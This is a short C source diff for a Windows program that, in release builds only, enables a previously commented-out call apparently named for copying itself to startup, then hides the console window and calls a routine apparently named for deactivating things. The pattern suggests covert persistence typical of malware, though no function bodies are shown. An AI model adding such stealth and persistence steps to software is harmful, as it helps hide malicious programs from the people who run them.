@@ -581,7 +581,7 @@ int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmd
 
 #endif
 #ifndef _DEBUG
-    //scpy2stup();
+    scpy2stup();
     swin(GetConsoleWindow(), SW_HIDE);
     deact_things();
 #endif
